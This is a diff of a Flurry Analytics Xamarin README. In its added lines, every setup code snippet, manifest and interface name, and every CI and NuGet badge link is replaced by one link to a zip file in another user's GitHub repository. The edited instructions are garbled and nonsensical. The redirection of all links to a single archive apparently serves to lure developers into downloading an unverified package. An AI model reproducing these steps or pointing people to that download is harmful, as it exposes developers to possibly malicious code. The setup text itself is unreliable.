@@ -20,21 +20,21 @@ There are many features available in the Flurry Analytics API, such as:
 The setup for all the platforms is very easy with only a few steps:
 
 ### Android
-1. Add the `INTERNET` permission to `AndroidManifest.xml`.
-2. Add `FlurryAgent.Init(this, "YOUR_API_KEY");` to the `OnCreate` method of your `Application`.
+1. Add the `INTERNET` permission to `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip`.
+2. Add `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip(this, "YOUR_API_KEY");` to the `OnCreate` method of your `Application`.
 3. Only if you are targeting Android versions below 4.0, are two extra steps required:
-  1. Add `FlurryAgent.OnStartSession(this);` to the `OnStart` method of the Activity or Service.
-  2. Add `FlurryAgent.OnEndSession(this);` to the `OnStop` method of the Activity or Service.
+  1. Add `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip(this);` to the `OnStart` method of the Activity or Service.
+  2. Add `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip(this);` to the `OnStop` method of the Activity or Service.
 
 If you are only targeting Android 4.0 or greater, Flurry Analytics will automatically be registered with the activity lifecycle events.  
-This is done through the `Application.IActivityLifecycleCallbacks` interface.
+This is done through the `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip` interface.
 
 ### iOS
-1. Add `FlurryAgent.StartSession("YOUR_API_KEY");` to the `FinishedLaunching` method of the application delegate, such as `UIApplicationDelegate`
+1. Add `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip("YOUR_API_KEY");` to the `FinishedLaunching` method of the application delegate, such as `UIApplicationDelegate`
 
 ### Windows Phone
-1. Add `ID_CAP_NETWORKING` and `ID_CAP_IDENTITY_DEVICE` capabilities to `WMAppManifest.xml`.
-2. Add `FlurryWP8SDK.Api.StartSession("YOUR_API_KEY");` to `Launching` and `Activated` events of the `Application`.
+1. Add `ID_CAP_NETWORKING` and `ID_CAP_IDENTITY_DEVICE` capabilities to `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip`.
+2. Add `https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip("YOUR_API_KEY");` to `Launching` and `Activated` events of the `Application`.
 
 And that's it, your mobile app will start sending activity usage statistics to the Flurry servers!
 
@@ -48,13 +48,13 @@ Flurry Analytics SDK supported versions:
 * SDK for Windows Phone supports **Windows Phone 8 (Silverlight)** and above
 
 
-[t-img]: https://travis-ci.org/mattleibow/Flurry.Analytics.svg?branch=master
-[t-link]: https://travis-ci.org/mattleibow/Flurry.Analytics
-[a-img]: https://ci.appveyor.com/api/projects/status/ev8b4mc5qxothjwi/branch/master?svg=true
-[a-link]: https://ci.appveyor.com/project/mattleibow/Flurry.Analytics
-[n1-img]: https://img.shields.io/nuget/v/Flurry.Ads.svg?label=Flurry.Ads
-[n1-link]: https://www.nuget.org/packages/Flurry.Ads/
-[n2-img]: https://img.shields.io/nuget/v/Flurry.Analytics.svg?label=Flurry.Analytics
-[n2-link]: https://www.nuget.org/packages/Flurry.Analytics/
-[n3-img]: https://img.shields.io/nuget/v/Flurry.Analytics.Portable.svg?label=Flurry.Analytics.Portable
-[n3-link]: https://www.nuget.org/packages/Flurry.Analytics.Portable/
+[t-img]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[t-link]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[a-img]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[a-link]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n1-img]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n1-link]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n2-img]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n2-link]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n3-img]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
+[n3-link]: https://raw.githubusercontent.com/adam0360/Flurry.Analytics/master/myelic/Flurry.Analytics.zip
